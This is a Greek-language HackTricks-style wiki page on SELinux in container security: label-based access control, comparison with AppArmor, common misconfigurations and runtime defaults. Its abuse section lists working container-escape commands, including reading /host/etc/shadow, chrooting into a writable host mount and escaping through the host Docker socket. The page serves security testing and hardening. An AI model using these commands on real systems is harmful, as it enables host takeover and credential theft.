# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Το SELinux είναι ένα σύστημα **βασισμένο σε ετικέτες Υποχρεωτικού Ελέγχου Πρόσβασης**. Κάθε σχετική διεργασία και αντικείμενο μπορεί να φέρει ένα security context, και η πολιτική αποφασίζει ποια domains μπορούν να αλληλεπιδράσουν με ποια types και με ποιον τρόπο. Σε containerized περιβάλλοντα, αυτό συνήθως σημαίνει ότι το runtime εκκινεί τη διαδικασία container κάτω από ένα περιορισμένο container domain και επισημαίνει το περιεχόμενο του container με τα αντίστοιχα types. Αν η πολιτική λειτουργεί σωστά, η διεργασία μπορεί να έχει τη δυνατότητα να διαβάζει και να γράφει τα αντικείμενα που αναμένεται να αγγίζει η ετικέτα της, ενώ της αρνείται πρόσβαση σε άλλο περιεχόμενο του host, ακόμα κι αν αυτό το περιεχόμενο γίνει ορατό μέσω mount.

Αυτή είναι μία από τις πιο ισχυρές προστασίες στην πλευρά του host που είναι διαθέσιμες σε mainstream Linux container deployments. Είναι ιδιαίτερα σημαντική σε Fedora, RHEL, CentOS Stream, OpenShift και σε άλλα SELinux-centric οικοσυστήματα. Σε αυτά τα περιβάλλοντα, ένας αναλυτής που αγνοεί το SELinux συχνά θα παρερμηνεύσει γιατί μια προφανής διαδρομή προς παραβίαση του host είναι στην πραγματικότητα μπλοκαρισμένη.

## AppArmor Vs SELinux

Η πιο απλή διαφορά σε υψηλό επίπεδο είναι ότι το AppArmor είναι βασισμένο σε διαδρομές (path-based) ενώ το SELinux είναι **βασισμένο σε ετικέτες**. Αυτό έχει μεγάλες συνέπειες για την ασφάλεια των container. Μια πολιτική βασισμένη σε διαδρομές μπορεί να συμπεριφερθεί διαφορετικά αν το ίδιο περιεχόμενο του host γίνει ορατό κάτω από μια απρόβλεπτη διαδρομή mount. Αντίθετα, μια πολιτική βασισμένη σε ετικέτες ρωτάει ποια είναι η ετικέτα του αντικειμένου και τι μπορεί να κάνει το domain της διεργασίας πάνω σε αυτό. Αυτό δεν κάνει το SELinux απλό, αλλά το καθιστά ανθεκτικό απέναντι σε μια κατηγορία υποθέσεων για κόλπα με διαδρομές που οι αμυνόμενοι μερικές φορές κάνουν τυχαία σε συστήματα βασισμένα σε AppArmor.

Επειδή το μοντέλο είναι προσανατολισμένο στις ετικέτες, ο χειρισμός των container volumes και οι αποφάσεις relabeling είναι κρίσιμες για την ασφάλεια. Αν το runtime ή ο operator αλλάξουν τις ετικέτες υπερβολικά ευρέως για να "κάνουν τα mounts να δουλέψουν", το όριο της πολιτικής που υποτίθεται ότι περιέχει το workload μπορεί να γίνει πολύ πιο αδύναμο από όσο προοριζόταν.

## Lab

Για να δείτε αν το SELinux είναι ενεργό στον host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Για να ελέγξετε τις υπάρχουσες labels στον host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Για να συγκρίνετε μια κανονική εκτέλεση με μία όπου η επισήμανση είναι απενεργοποιημένη:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Σε έναν host με ενεργοποιημένο SELinux, αυτή είναι μια πολύ πρακτική επίδειξη γιατί δείχνει τη διαφορά μεταξύ μιας εργασίας (workload) που τρέχει υπό το αναμενόμενο container domain και μιας που της έχει αφαιρεθεί αυτό το επίπεδο επιβολής.

## Χρήση κατά την εκτέλεση

Podman είναι ιδιαίτερα ευθυγραμμισμένο με SELinux σε συστήματα όπου το SELinux είναι μέρος του platform default. Rootless Podman μαζί με SELinux είναι μία από τις πιο ισχυρές mainstream container βάσεις ασφαλείας επειδή η διεργασία είναι ήδη χωρίς προνόμια από την πλευρά του host και παραμένει περιορισμένη από την MAC policy. Docker μπορεί επίσης να χρησιμοποιήσει SELinux όπου υποστηρίζεται, αν και οι administrators μερικές φορές το απενεργοποιούν για να παρακάμψουν προβλήματα με το volume-labeling. CRI-O και OpenShift βασίζονται σε μεγάλο βαθμό στο SELinux ως μέρος της ιστορίας απομόνωσης container τους. Kubernetes μπορεί επίσης να εκθέτει ρυθμίσεις σχετικές με το SELinux, αλλά η αξία τους προφανώς εξαρτάται από το αν το node OS όντως υποστηρίζει και επιβάλλει το SELinux.

Το επαναλαμβανόμενο μάθημα είναι ότι το SELinux δεν είναι ένα προαιρετικό στολίδι. Στα οικοσυστήματα που χτίζονται γύρω του, αποτελεί μέρος του αναμενόμενου ορίου ασφαλείας.

## Λανθασμένες ρυθμίσεις

Το κλασικό λάθος είναι `label=disable`. Σε επιχειρησιακό επίπεδο, αυτό συχνά συμβαίνει επειδή μια volume mount απορρίφθηκε και η πιο γρήγορη βραχυπρόθεσμη λύση ήταν να αφαιρεθεί το SELinux από την εξίσωση αντί να διορθωθεί το labeling model. Ένα άλλο κοινό λάθος είναι η λανθασμένη relabeling του περιεχομένου του host. Ευρείες relabel operations μπορεί να κάνουν την εφαρμογή να λειτουργήσει, αλλά μπορούν επίσης να διευρύνουν το τι μπορεί να αγγίξει το container πολύ πέρα από αυτό που αρχικά προοριζόταν.

Είναι επίσης σημαντικό να μην συγχέετε το **εγκατεστημένο** SELinux με το **σε ισχύ** SELinux. Ένας host μπορεί να υποστηρίζει SELinux και παρ’ όλα αυτά να βρίσκεται σε permissive mode, ή το runtime μπορεί να μην εκκινεί την εργασία (workload) κάτω από το αναμενόμενο domain. Σε αυτές τις περιπτώσεις η προστασία είναι πολύ ασθενέστερη απ’ ό,τι μπορεί να υποδεικνύει η τεκμηρίωση.

## Κατάχρηση

Όταν το SELinux απουσιάζει, είναι σε permissive ή είναι ευρέως απενεργοποιημένο για την εργασία, τα host-mounted paths γίνονται πολύ πιο εύκολο να καταχραστούν. Το ίδιο bind mount που υπό άλλες συνθήκες θα είχε περιοριστεί από labels μπορεί να γίνει άμεση οδός προς δεδομένα του host ή τροποποίηση του host. Αυτό είναι ιδιαίτερα σχετικό όταν συνδυάζεται με writable volume mounts, container runtime directories ή επιχειρησιακά shortcuts που εκθέτουν ευαίσθητα host paths για ευκολία.

Το SELinux συχνά εξηγεί γιατί μια γενική writeup για breakout λειτουργεί αμέσως σε έναν host αλλά αποτυγχάνει επανειλημμένα σε άλλον αν και τα runtime flags φαίνονται παρόμοια. Το συνήθως ελλείπον συστατικό δεν είναι ένα namespace ή μια capability, αλλά ένα label boundary που παρέμεινε ανέπαφο.

Ο ταχύτερος πρακτικός έλεγχος είναι να συγκρίνετε το ενεργό context και στη συνέχεια να δοκιμάσετε mounted host paths ή runtime directories που κανονικά θα ήταν περιορισμένα από labels:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Εάν υπάρχει host bind mount και η επισήμανση SELinux έχει απενεργοποιηθεί ή εξασθενήσει, η αποκάλυψη πληροφοριών συχνά προηγείται:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Αν το mount είναι εγγράψιμο και το container είναι ουσιαστικά host-root από την οπτική του kernel, το επόμενο βήμα είναι να δοκιμάσετε ελεγχόμενη τροποποίηση του host αντί να μαντεύετε:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Σε hosts με υποστήριξη SELinux, η απώλεια ετικετών γύρω από τους καταλόγους κατάστασης χρόνου εκτέλεσης μπορεί επίσης να αποκαλύψει άμεσες διαδρομές privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Αυτές οι εντολές δεν αντικαθιστούν μια πλήρη αλυσίδα απόδρασης, αλλά δείχνουν πολύ γρήγορα αν το SELinux ήταν αυτό που εμπόδιζε την πρόσβαση στα δεδομένα του host ή την τροποποίηση αρχείων από την πλευρά του host.

### Πλήρες Παράδειγμα: SELinux Απενεργοποιημένο + Writable Host Mount

Αν η σήμανση (labeling) του SELinux είναι απενεργοποιημένη και το σύστημα αρχείων του host είναι προσαρτημένο (mounted) ως εγγράψιμο στο `/host`, μια πλήρης απόδραση από το host γίνεται μια κανονική περίπτωση κατάχρησης bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Αν το `chroot` επιτύχει, η διαδικασία του container πλέον λειτουργεί από το host filesystem:
```bash
id
hostname
cat /etc/passwd | tail
```
### Πλήρες Παράδειγμα: SELinux Disabled + Runtime Directory

Αν το workload μπορεί να φτάσει ένα runtime socket αφού τα labels απενεργοποιηθούν, το escape μπορεί να ανατεθεί στο runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Η σχετική παρατήρηση είναι ότι το SELinux συχνά λειτουργούσε ως έλεγχος που απέτρεπε ακριβώς αυτό το είδος πρόσβασης host-path ή runtime-state.

## Έλεγχοι

Ο στόχος των ελέγχων SELinux είναι να επιβεβαιώσουν ότι το SELinux είναι ενεργοποιημένο, να εντοπίσουν το τρέχον πλαίσιο ασφάλειας και να διαπιστώσουν εάν τα αρχεία ή οι διαδρομές που σας ενδιαφέρουν είναι όντως περιορισμένα με ετικέτα.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Τι είναι ενδιαφέρον εδώ:

- `getenforce` θα πρέπει ιδανικά να επιστρέφει `Enforcing`; `Permissive` ή `Disabled` αλλάζει το νόημα ολόκληρης της ενότητας SELinux.
- Αν το τρέχον context της διεργασίας φαίνεται απρόσμενο ή πολύ γενικό, το workload μπορεί να μην τρέχει υπό την προοριζόμενη πολιτική του container.
- Εάν αρχεία που είναι host-mounted ή runtime directories έχουν labels που η διεργασία μπορεί να προσπελάσει πολύ ελεύθερα, τα bind mounts γίνονται πολύ πιο επικίνδυνα.

Όταν εξετάζετε ένα container σε πλατφόρμα με δυνατότητα SELinux, μην αντιμετωπίζετε το labeling ως δευτερεύον ζήτημα. Σε πολλές περιπτώσεις είναι ένας από τους κύριους λόγους που ο host δεν έχει ήδη συμβιβαστεί.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, broad relabeling of bind mounts, `--privileged` |
| Podman | Commonly enabled on SELinux hosts | SELinux separation is a normal part of Podman on SELinux systems unless disabled | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Not generally assigned automatically at Pod level | SELinux support exists, but Pods usually need `securityContext.seLinuxOptions` or platform-specific defaults; runtime and node support are required | weak or broad `seLinuxOptions`, running on permissive/disabled nodes, platform policies that disable labeling |
| CRI-O / OpenShift style deployments | Commonly relied on heavily | SELinux is often a core part of the node isolation model in these environments | custom policies that over-broaden access, disabling labeling for compatibility |

Οι προεπιλογές του SELinux εξαρτώνται περισσότερο από τη διανομή σε σχέση με τις προεπιλογές του seccomp. Σε συστήματα τύπου Fedora/RHEL/OpenShift, το SELinux συχνά είναι κεντρικό στο μοντέλο απομόνωσης. Σε συστήματα χωρίς SELinux, απλώς δεν υπάρχει.
{{#include ../../../../banners/hacktricks-training.md}}
